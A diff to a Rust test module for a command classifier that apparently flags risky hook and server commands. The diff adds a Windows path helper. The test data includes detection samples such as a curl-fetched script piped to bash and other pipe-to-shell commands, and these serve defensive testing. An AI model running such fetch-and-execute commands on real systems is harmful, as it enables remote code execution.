@@ -2415,6 +2415,41 @@ mod tests {
         classify_shell_text(text).map(|finding| finding.kind)
     }
 
+    /// The Unix examples name absolute paths under /opt, /home and /usr. On
+    /// Windows such a path has no drive, so it is not absolute and reads as
+    /// relative. Give it a drive there, so each example means the same on
+    /// every host.
+    fn on_host(text: &str) -> String {
+        if !cfg!(windows) {
+            return text.to_string();
+        }
+        text.split(' ')
+            .map(|word| {
+                let quote = if word.starts_with('\'') { "'" } else { "" };
+                let rest = &word[quote.len()..];
+                if ["/opt/", "/home/", "/usr/"]
+                    .iter()
+                    .any(|root| rest.starts_with(root))
+                {
+                    format!("{quote}C:{rest}")
+                } else {
+                    word.to_string()
+                }
+            })
+            .collect::<Vec<_>>()
+            .join(" ")
+    }
+
+    fn host_argv(command: &str, args: &[&str]) -> Option<Kind> {
+        let args: Vec<String> = args.iter().map(|arg| on_host(arg)).collect();
+        let args: Vec<&str> = args.iter().map(String::as_str).collect();
+        argv(&on_host(command), &args)
+    }
+
+    fn host_shell(text: &str) -> Option<Kind> {
+        shell(&on_host(text))
+    }
+
     #[test]
     fn the_documented_examples_hold() {
         for (text, kind) in [
@@ -2483,7 +2518,7 @@ mod tests {
             ("node /opt/server.js", Some(Kind::UnknownProgram)),
             ("bash -c 'cd /srv && ./start.sh'", Some(Kind::ShellText)),
         ] {
-            assert_eq!(shell(text), kind, "{text}");
+            assert_eq!(host_shell(text), kind, "{text}");
         }
     }
 
@@ -2681,15 +2716,15 @@ mod tests {
             "uvx mcp-server-fetch==2025.1.1",
             "pipx run --spec black==24.1.0 black .",
         ] {
-            assert_eq!(shell(text), None, "{text}");
+            assert_eq!(host_shell(text), None, "{text}");
         }
-        assert_eq!(argv("jq", &["-r", ".tool_name"]), None);
+        assert_eq!(host_argv("jq", &["-r", ".tool_name"]), None);
         assert_eq!(
-            argv("npx", &["-y", "@xcraftmind/mastermind@4.0.1", "serve"]),
+            host_argv("npx", &["-y", "@xcraftmind/mastermind@4.0.1", "serve"]),
             None
         );
         assert_eq!(
-            argv(
+            host_argv(
                 "cmd.exe",
                 &[
                     "/d",
@@ -3000,7 +3035,7 @@ mod tests {
             "/opt/homebrew/bin/gitleaks protect --staged",
             "/home/me/project/node_modules/.bin/eslint --fix .",
         ] {
-            assert_eq!(shell(text), Some(Kind::RepoConfigTool), "{text}");
+            assert_eq!(host_shell(text), Some(Kind::RepoConfigTool), "{text}");
         }
         assert_eq!(Kind::RepoConfigTool.severity(), Severity::Info);
         // Reviewer counter-example: the node_modules/.bin branch skipped the
@@ -3010,13 +3045,13 @@ mod tests {
             "node_modules/.bin/prettier --write .",
             "/home/me/project/../../tmp/node_modules/.bin/eslint .",
         ] {
-            assert_eq!(shell(text), Some(Kind::UnknownProgram), "{text}");
+            assert_eq!(host_shell(text), Some(Kind::UnknownProgram), "{text}");
         }
         for text in [
             "/tmp/x/node_modules/.bin/prettier --write .",
             "/var/tmp/node_modules/.bin/eslint .",
         ] {
-            assert_eq!(shell(text), Some(Kind::TemporaryProgram), "{text}");
+            assert_eq!(host_shell(text), Some(Kind::TemporaryProgram), "{text}");
         }
     }
 
@@ -3675,14 +3710,17 @@ mod tests {
             "cat scripts/check.sh | sh",
             "cat ./a.sh ./b.sh | bash -s",
         ] {
-            assert_eq!(shell(text), Some(Kind::ShellText), "{text}");
+            assert_eq!(host_shell(text), Some(Kind::ShellText), "{text}");
             assert_eq!(
-                shell(text).map(Kind::severity),
+                host_shell(text).map(Kind::severity),
                 Some(Severity::Warn),
                 "{text}"
             );
         }
-        assert_eq!(shell("bash ./scripts/check.sh"), Some(Kind::UnknownProgram));
+        assert_eq!(
+            host_shell("bash ./scripts/check.sh"),
+            Some(Kind::UnknownProgram)
+        );
         // Anything else piped from `cat` is still an error.
         for text in [
             "cat /tmp/i.sh | bash",
@@ -3693,7 +3731,7 @@ mod tests {
             "cat ./a.sh | tr a b | bash",
             "cat \"$(curl -s https://x.example/i)\" | bash",
         ] {
-            assert_eq!(shell(text), Some(Kind::FetchAndExec), "{text}");
+            assert_eq!(host_shell(text), Some(Kind::FetchAndExec), "{text}");
         }
         // Reviewer oddity: `npx --no` installs nothing, so it is not an
         // unpinned runner.
@@ -3702,20 +3740,20 @@ mod tests {
             "npx --no-install eslint .",
             "npm exec --no -- tsc",
         ] {
-            assert_eq!(shell(text), Some(Kind::UnknownProgram), "{text}");
+            assert_eq!(host_shell(text), Some(Kind::UnknownProgram), "{text}");
         }
-        assert_eq!(shell("npx prettier"), Some(Kind::UnpinnedRunner));
+        assert_eq!(host_shell("npx prettier"), Some(Kind::UnpinnedRunner));
         // A program run from a temporary directory has its own message.
         for text in ["/tmp/tool --check", "sh /tmp/x.sh", "python3 /var/tmp/x.py"] {
-            assert_eq!(shell(text), Some(Kind::TemporaryProgram), "{text}");
+            assert_eq!(host_shell(text), Some(Kind::TemporaryProgram), "{text}");
         }
         assert_eq!(Kind::TemporaryProgram.severity(), Severity::Warn);
         // Reviewer oddity: a launcher removed by an upgrade read as a
         // program doctor does not know.
         let gone = "/opt/homebrew/Cellar/mastermind/0.0.0-gone/bin/mastermind";
-        assert_eq!(argv(gone, &["serve"]), Some(Kind::LauncherMissing));
+        assert_eq!(host_argv(gone, &["serve"]), Some(Kind::LauncherMissing));
         assert_eq!(
-            argv(
+            host_argv(
                 "/opt/homebrew/Cellar/node/0.0.0-gone/bin/node",
                 &[
                     "/opt/homebrew/lib/node_modules/@xcraftmind/mastermind/bin/mastermind.js",
@@ -3726,7 +3764,7 @@ mod tests {
         );
         let marker = crate::miner::hooks::registration_marker("claude", "/repo");
         assert_eq!(
-            shell(&format!(
+            host_shell(&format!(
                 "'{gone}' miner hooks receive --client 'claude' --project-root '/repo' {marker}"
             )),
             Some(Kind::LauncherMissing)
@@ -3736,15 +3774,15 @@ mod tests {
         // reported as missing.
         let own = own_binary();
         assert_ne!(
-            argv(&format!("{own}-gone/../x"), &["serve"]),
+            host_argv(&format!("{own}-gone/../x"), &["serve"]),
             Some(Kind::LauncherMissing)
         );
         assert_eq!(
-            argv("/tmp/gone-mastermind", &["serve"]),
+            host_argv("/tmp/gone-mastermind", &["serve"]),
             Some(Kind::TemporaryProgram)
         );
         assert_eq!(
-            argv("/opt/gone/tool", &["--check"]),
+            host_argv("/opt/gone/tool", &["--check"]),
             Some(Kind::UnknownProgram)
         );
     }
